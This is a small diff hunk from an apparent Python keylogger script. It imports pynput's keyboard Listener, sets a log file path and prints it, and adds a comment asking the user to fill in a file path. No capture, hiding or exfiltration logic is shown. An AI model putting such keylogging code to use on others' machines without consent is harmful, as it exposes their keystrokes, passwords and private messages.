@@ -2,6 +2,8 @@ from pynput.keyboard import Listener
 import os
 
 log_file_path = "nidhi ji/log.txt"
+# write your file path ("location")
+
 print("Absolute path of log file:", os.path.abspath(log_file_path))
 
 # function to log key
